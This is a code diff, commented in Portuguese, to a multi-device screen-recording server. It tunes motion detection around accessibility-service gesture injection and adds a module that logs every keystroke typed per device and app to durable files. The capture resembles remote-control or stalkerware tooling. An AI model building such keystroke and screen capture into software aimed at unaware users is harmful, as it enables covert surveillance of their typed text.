@@ -152,7 +152,13 @@ def _copiar_para_fps(caminho_video):
 # ocupando memória. A detecção usa frame-diff (cv2) em miniatura 64x64; sem
 # cv2, usa um proxy por hash de amostra do JPEG (sem detectar tela apagada).
 # ---------------------------------------------------------------------------
-LIMIAR_MOVIMENTO = 2.2          # média de |diff| (0-255) na miniatura: acima = movimento
+LIMIAR_MOVIMENTO = 1.0          # média de |diff| (0-255) na miniatura: acima = movimento
+                                # (reduzido de 2.2 para 1.0 — captura mudanças sutis
+                                # na tela; ver LIMIAR_MOVIMENTO_ACESSIBILIDADE p/ o
+                                # modo ainda mais sensível quando há acessibilidade).
+LIMIAR_MOVIMENTO_ACESSIBILIDADE = 0.8  # limiar aplicado quando houve atividade de
+                                # acessibilidade recente (ver evento_acessibilidade
+                                # no server.py) — pega micro-mudanças da automação.
 LIMIAR_TELA_ESCURA = 14.0       # brilho médio (0-255): abaixo = tela apagada/preta
 GRACE_PARAR_SEM_MOVIMENTO_S = 4.0  # segundos parado (e tela apagada) antes de parar
 # Trava anti-memória: mesmo com a tela ACESA, se ficar totalmente parado (sem
@@ -184,10 +190,15 @@ def tempo_desde_movimento(dispositivo):
         return time.time() - st.get("ultimo_mov_ts", 0.0)
 
 
-def avaliar_frame(dispositivo, jpeg_bytes):
+def avaliar_frame(dispositivo, jpeg_bytes, limiar=None):
     """Compara o frame atual com o anterior deste dispositivo.
     Retorna (tem_movimento: bool, tela_escura: bool). Atualiza ultimo_mov_ts
-    quando detecta movimento visual."""
+    quando detecta movimento visual.
+
+    limiar: sensibilidade de |diff| para considerar movimento. Se None usa
+    LIMIAR_MOVIMENTO; o server.py passa LIMIAR_MOVIMENTO_ACESSIBILIDADE (mais
+    baixo) quando houve atividade de acessibilidade recente no dispositivo."""
+    _limiar = LIMIAR_MOVIMENTO if limiar is None else float(limiar)
     agora = time.time()
     if cv2 is not None and np is not None:
         try:
@@ -202,7 +213,7 @@ def avaliar_frame(dispositivo, jpeg_bytes):
                 prev = st.get("prev")
                 tem_mov = False
                 if prev is not None:
-                    if float(cv2.absdiff(prev, peq).mean()) >= LIMIAR_MOVIMENTO:
+                    if float(cv2.absdiff(prev, peq).mean()) >= _limiar:
                         tem_mov = True
                 st["prev"] = peq
                 if tem_mov:
@@ -228,6 +239,33 @@ def avaliar_frame(dispositivo, jpeg_bytes):
             return (tem_mov, False)  # sem cv2 não há detecção confiável de tela apagada
         except Exception:
             return (True, False)
+
+
+def marcar_evento_acessibilidade(dispositivo):
+    """Marca que o dispositivo ACABOU de usar acessibilidade (Inject/gesto do
+    serviço). Conta como movimento imediato (para disparar a gravação) E grava
+    um timestamp separado 'ultimo_acess_ts' usado para MANTER a gravação viva
+    por JANELA_ACESSIBILIDADE_S mesmo que a tela pareça estática."""
+    if not dispositivo:
+        return
+    agora = time.time()
+    with _trava_mov:
+        st = _mov_estado.get(dispositivo) or {}
+        st["ultimo_mov_ts"] = agora       # acessibilidade conta como movimento
+        st["ultimo_acess_ts"] = agora     # trilha própria p/ a janela anti-corte
+        _mov_estado[dispositivo] = st
+
+
+def tempo_desde_acessibilidade(dispositivo):
+    """Segundos desde o último evento de acessibilidade. Grande se nunca houve."""
+    with _trava_mov:
+        st = _mov_estado.get(dispositivo)
+        if not st:
+            return 1e9
+        _ts = st.get("ultimo_acess_ts")
+        if not _ts:
+            return 1e9
+        return time.time() - _ts
 
 
 def limpar_estado_movimento(dispositivo):
@@ -339,11 +377,12 @@ EXTENSAO = ".avi"
 FPS_ALVO = 15.0          # cadência de escrita; frames chegam em rajada e são
                          # serializados pela fila — o relógio do vídeo é o do
                          # VideoWriter (1/fps por frame), não o da chegada.
-MAX_FILA = 1000          # ~66s a 15fps mantidos em RAM (reduzido de 2000 para
-                         # 1000 — com 15+ dispositivos, 2000×15×~60KB = ~1.8GB
-                         # pior caso; 1000 mantém buffer generoso sem estourar
-                         # memória). Quando cheia, aplica backpressure (bloqueia
-                         # o produtor) — NUNCA descarta frames (ver enfileirar()).
+MAX_FILA = 180           # ~12s a 15fps mantidos em RAM (reduzido de 1000 para
+                         # 180 — PROTEÇÃO DE RAM em máquina de 8GB: se o SSD
+                         # engasgar, a fila por dispositivo não acumula centenas
+                         # de MB. Pior caso 7 disp × 180 × ~60KB ≈ 75MB, folgado.
+                         # Quando cheia, aplica backpressure (bloqueia o
+                         # produtor) — NUNCA descarta frames (ver enfileirar()).
 MAX_HISTORICO_ENTRADAS = 5000  # tampa o histórico para o JSON não crescer sem fim.
 
 
@@ -414,6 +453,137 @@ def registrar_input(tipo, dispositivo, **campos):
                 print(f"[AUDITORIA INPUTS FALHA] {e} :: {texto.rstrip()}", flush=True)
             except Exception:
                 pass
+
+
+# ---------------------------------------------------------------------------
+# DIGITAÇÃO AO VIVO — acúmulo das teclas NA MESMA LINHA, em ordem.
+# ---------------------------------------------------------------------------
+# Cada tecla chega UMA a UMA (evento 'teclado_tecla', capturado no clique da
+# tecla do teclado virtual) e é registrada IMEDIATAMENTE — nenhuma letra se
+# perde:
+#   • mantém um buffer por dispositivo com o texto que está sendo digitado;
+#   • a cada tecla reescreve um arquivo PARCIAL durável (flush+fsync) — se o
+#     servidor cair no meio, a última letra já está em disco;
+#   • FECHA a linha (grava a sequência completa em UMA linha no .log) quando:
+#     Enter ("\n"), troca de app, ociosidade (> IDLE_LINHA_TECLADO_S) ou
+#     desconexão do dispositivo.
+# Saída:
+#   gravacoes/teclado/<slug>.log        -> 1 linha JSON por sessão de digitação
+#                                          {ts, dispositivo, app, texto, motivo}
+#   gravacoes/teclado/<slug>.atual.txt  -> texto da linha em andamento (volátil)
+# ---------------------------------------------------------------------------
+PASTA_TECLADO = os.path.join(PASTA_GRAVACOES, "teclado")
+try:
+    os.makedirs(PASTA_TECLADO, exist_ok=True)
+except Exception:
+    pass
+IDLE_LINHA_TECLADO_S = 8.0   # gap sem digitar que fecha a linha atual
+_trava_teclado = threading.Lock()
+_buffers_teclado = {}        # dispositivo -> {"texto","app","ultimo_ts"}
+
+
+def _caminho_log_teclado(dispositivo):
+    return os.path.join(PASTA_TECLADO, f"{_slug_dispositivo(dispositivo)}.log")
+
+
+def _caminho_parcial_teclado(dispositivo):
+    return os.path.join(PASTA_TECLADO, f"{_slug_dispositivo(dispositivo)}.atual.txt")
+
+
+def _persistir_parcial_teclado(dispositivo, st):
+    """Grava o texto em andamento (durável) — garante que nenhuma letra se perca
+    mesmo se a linha ainda não foi fechada."""
+    try:
+        with open(_caminho_parcial_teclado(dispositivo), "w", encoding="utf-8") as f:
+            f.write(st.get("texto", ""))
+            f.flush()
+            os.fsync(f.fileno())
+    except Exception:
+        pass
+
+
+def _fechar_linha_teclado(dispositivo, st, motivo="flush"):
+    """Grava a sequência acumulada em UMA linha no .log e limpa o parcial."""
+    texto = st.get("texto", "")
+    if not texto:
+        return
+    linha = {
+        "ts": datetime.datetime.now().astimezone().isoformat(timespec="milliseconds"),
+        "dispositivo": str(dispositivo),
+        "app": st.get("app"),
+        "texto": texto,
+        "motivo": motivo,
+    }
+    try:
+        with open(_caminho_log_teclado(dispositivo), "a", encoding="utf-8") as f:
+            f.write(json.dumps(linha, ensure_ascii=False, default=str) + "\n")
+            f.flush()
+            os.fsync(f.fileno())
+    except Exception as e:
+        try:
+            print(f"[TECLADO FALHA] {e} :: {texto}", flush=True)
+        except Exception:
+            pass
+    # Espelha na trilha única de inputs: 1 linha = 1 sessão de digitação.
+    try:
+        registrar_input("texto_digitado", dispositivo, texto=texto,
+                        app=st.get("app"), motivo=motivo)
+    except Exception:
+        pass
+    # Linha fechada: remove o parcial.
+    try:
+        os.remove(_caminho_parcial_teclado(dispositivo))
+    except Exception:
+        pass
+
+
+def registrar_tecla(dispositivo, tecla, app=None):
+    """Registra UMA tecla no instante do toque, acumulando na MESMA linha.
+
+    tecla: caractere cru vindo do app — letra/dígito/símbolo, " " (espaço),
+           "\\b" (backspace/apagar) ou "\\n" (enter/confirmar).
+    Nunca levanta exceção."""
+    if not dispositivo or tecla is None:
+        return
+    agora = time.time()
+    with _trava_teclado:
+        st = _buffers_teclado.get(dispositivo)
+        # Ociosidade: fecha a linha anterior e começa outra.
+        if st and (agora - st.get("ultimo_ts", agora)) > IDLE_LINHA_TECLADO_S:
+            _fechar_linha_teclado(dispositivo, st, motivo="idle")
+            st = None
+        # Troca de app: fecha a linha anterior (contexto diferente).
+        if st and app and st.get("app") and app != st.get("app"):
+            _fechar_linha_teclado(dispositivo, st, motivo="troca_app")
+            st = None
+        if st is None:
+            st = {"texto": "", "app": app, "ultimo_ts": agora}
+            _buffers_teclado[dispositivo] = st
+        st["ultimo_ts"] = agora
+        if app:
+            st["app"] = app
+        if tecla == "\b":
+            # Apagar: remove o último caractere (espelha o backspace do usuário).
+            st["texto"] = st["texto"][:-1]
+            _persistir_parcial_teclado(dispositivo, st)
+        elif tecla == "\n":
+            # Enter: fecha a linha agora (confirma/envia).
+            _fechar_linha_teclado(dispositivo, st, motivo="enter")
+            _buffers_teclado.pop(dispositivo, None)
+        else:
+            st["texto"] += tecla
+            _persistir_parcial_teclado(dispositivo, st)
+
+
+def finalizar_teclado(dispositivo=None):
+    """Fecha a(s) linha(s) em andamento (ao desconectar o dispositivo ou no
+    shutdown). Sem argumento, fecha todas."""
+    with _trava_teclado:
+        nomes = [dispositivo] if dispositivo else list(_buffers_teclado.keys())
+        for n in nomes:
+            st = _buffers_teclado.pop(n, None)
+            if st:
+                _fechar_linha_teclado(n, st, motivo="desconexao")
 
 
 # ---------------------------------------------------------------------------
@@ -580,7 +750,12 @@ class GravadorVideo:
     # -- loop interno (thread) --------------------------------------------
     def _loop_escrita(self):
         fourcc = cv2.VideoWriter_fourcc(*CODEC)
-        while not self._finalizado.is_set() or not self._fila.empty():
+        # SEGURANÇA NO FECHAMENTO: try/finally garante o release() do VideoWriter
+        # mesmo que uma exceção inesperada escape do laço (fila, decode, etc.).
+        # Sem release(), o arquivo .avi fica com o índice MJPG incompleto e abre
+        # corrompido. O finally abaixo fecha SEMPRE.
+        try:
+          while not self._finalizado.is_set() or not self._fila.empty():
             try:
                 jpeg = self._fila.get(timeout=0.05)  # prioridade alta de drenagem
             except queue.Empty:
@@ -627,11 +802,23 @@ class GravadorVideo:
             except Exception as e:
                 self._erro = str(e)
                 self._frames_descartados += 1
-        if self._writer is not None:
+        except Exception as _e_loop:
+            # Exceção INESPERADA fora do try por-frame: registra e cai no finally
+            # (que fecha o arquivo), em vez de deixar a thread morrer com o
+            # VideoWriter aberto e o .avi corrompido.
+            self._erro = f"loop_escrita: {_e_loop}"
             try:
-                self._writer.release()
+                registrar_auditoria("loop_escrita_erro",
+                                    dispositivo=self.dispositivo,
+                                    sessao=self.sessao_id, erro=self._erro)
             except Exception:
                 pass
+        finally:
+            if self._writer is not None:
+                try:
+                    self._writer.release()
+                except Exception:
+                    pass
 
 
 class GravadorFallback:
